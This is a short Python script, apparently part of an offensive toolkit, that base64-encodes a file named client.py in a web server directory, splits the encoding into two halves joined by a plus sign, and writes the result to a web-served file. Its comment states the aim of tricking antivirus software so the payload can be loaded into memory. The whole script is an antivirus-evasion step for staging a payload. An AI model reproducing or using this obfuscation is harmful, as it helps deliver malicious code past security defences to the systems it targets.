# this code tricks the antivirus, we divide payload in two than upload to memory
import base64

f = open('/var/www/html/client.py', 'r')
client = f.read()
f.close()

#encoded == base64(client)
encoded = base64.b64encode(str.encode(client)).decode('utf-8')

d = int(len(encoded)/2)
part1 = encoded[:d]
part2 = encoded[d:]

newpayload = part1 + '+' + part2

with open("/var/www/html/encoded", "w") as f:
	f.write(newpayload)
